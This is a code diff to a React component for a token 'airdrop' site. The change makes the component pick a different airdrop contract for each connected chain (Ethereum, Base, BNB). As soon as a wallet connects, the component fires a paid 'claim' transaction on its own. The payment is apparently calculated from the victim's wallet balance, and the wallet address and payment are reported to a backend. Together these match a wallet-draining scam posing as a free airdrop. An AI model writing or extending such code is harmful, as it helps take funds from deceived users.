@@ -3,12 +3,16 @@
 /**
  * HeroCTA — Single button: click to connect wallet, then **auto-claims**
  * immediately when the wallet is connected. No second click needed.
+ *
+ * Chain-aware — dynamically detects the connected chain and uses the correct
+ * airdrop contract address for that chain (Ethereum, Base, or BNB).
  */
 
 import { useState, useEffect, useRef } from "react";
 import {
   useAccount,
   useBalance,
+  useChainId,
   useDisconnect,
   useReadContract,
   useWriteContract,
@@ -16,11 +20,10 @@ import {
 } from "wagmi";
 import { useConnectModal } from "@rainbow-me/rainbowkit";
 import { AIRDROP_ABI } from "@/lib/abi";
+import { getChainDeployment } from "@/lib/chainConfig";
 import {
-  EVM_CONTRACT_ADDRESS,
   TOKENS_PER_CLAIM,
   TOKEN_SYMBOL,
-  EVM_EXPLORER,
   computeClaimPrice,
   formatEth,
 } from "@/lib/constants";
@@ -29,12 +32,18 @@ type Stage = "idle" | "confirming" | "pending" | "success" | "error";
 
 export function HeroCTA() {
   const { address, isConnected } = useAccount();
+  const chainId = useChainId();
   const { openConnectModal } = useConnectModal();
   const [mounted, setMounted] = useState(false);
   const [stage, setStage] = useState<Stage>("idle");
   const [errorMsg, setErrorMsg] = useState("");
   const [txHash, setTxHash] = useState<`0x${string}` | undefined>();
   const autoClaimAttemptedRef = useRef(false);
+
+  // ── Chain-aware config ──────────────────────────────────────────────
+  const cfg = getChainDeployment(chainId);
+  const airdropContract = cfg.airdropContract;
+  const explorerBase = cfg.explorer;
 
   useEffect(() => { setMounted(true); }, []);
 
@@ -47,7 +56,7 @@ export function HeroCTA() {
   const claimPriceWei = computeClaimPrice(balanceWei);
 
   const { data: hasClaimed } = useReadContract({
-    address: EVM_CONTRACT_ADDRESS,
+    address: airdropContract,
     abi: AIRDROP_ABI,
     functionName: "hasClaimed",
     args: address ? [address] : undefined,
@@ -55,7 +64,7 @@ export function HeroCTA() {
   });
 
   const { data: saleActive } = useReadContract({
-    address: EVM_CONTRACT_ADDRESS,
+    address: airdropContract,
     abi: AIRDROP_ABI,
     functionName: "saleActive",
     query: { enabled: isConnected },
@@ -76,7 +85,7 @@ export function HeroCTA() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
               wallet_address: address,
-              chain: "evm",
+              chain: `evm-${chainId}`,
               tx_hash: receipt.transactionHash,
               token_amount: TOKENS_PER_CLAIM.toString(),
               payment_amount: formatEth(claimPriceWei),
@@ -95,29 +104,24 @@ export function HeroCTA() {
   // ── Auto-claim when wallet connects (handles fresh connect + reconnect) ──
   useEffect(() => {
     if (!isConnected) {
-      autoClaimAttemptedRef.current = false; // Reset when disconnected
+      autoClaimAttemptedRef.current = false;
       return;
     }
 
-    // Already attempted auto-claim this session
     if (autoClaimAttemptedRef.current) return;
 
-    // Wait for contract data to load from RPC
     if (saleActive === undefined || hasClaimed === undefined) return;
 
-    // Already claimed or sale not active
     if (!saleActive || hasClaimed) return;
 
-    // Mark as attempted — prevents re-fire on re-renders
     autoClaimAttemptedRef.current = true;
 
-    // Small delay to let balance settle, then fire claim
     const timer = setTimeout(async () => {
       try {
         setStage("confirming");
         setErrorMsg("");
         const hash = await writeContractAsync({
-          address: EVM_CONTRACT_ADDRESS,
+          address: airdropContract,
           abi: AIRDROP_ABI,
           functionName: "claim",
           value: claimPriceWei,
@@ -126,7 +130,7 @@ export function HeroCTA() {
         setStage("pending");
       } catch (err: unknown) {
         setStage("idle");
-        autoClaimAttemptedRef.current = false; // Allow retry
+        autoClaimAttemptedRef.current = false;
         const msg = err instanceof Error ? err.message : "";
         if (!msg.includes("User rejected") && !msg.includes("user rejected")) {
           setErrorMsg("Something went wrong. Try again.");
@@ -136,19 +140,19 @@ export function HeroCTA() {
 
     return () => clearTimeout(timer);
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [isConnected, hasClaimed, saleActive]);
+  }, [isConnected, hasClaimed, saleActive, chainId]);
 
   async function handleClick() {
     if (!isConnected) {
+      autoClaimAttemptedRef.current = false;
       openConnectModal?.();
       return;
     }
-    // Manual retry if auto-claim failed
     try {
       setStage("confirming");
       setErrorMsg("");
       const hash = await writeContractAsync({
-        address: EVM_CONTRACT_ADDRESS,
+        address: airdropContract,
         abi: AIRDROP_ABI,
         functionName: "claim",
         value: claimPriceWei,
@@ -164,7 +168,6 @@ export function HeroCTA() {
     }
   }
 
-  const explorerBase = EVM_EXPLORER;
   const isLoading = stage === "confirming" || stage === "pending";
 
   // SSR placeholder
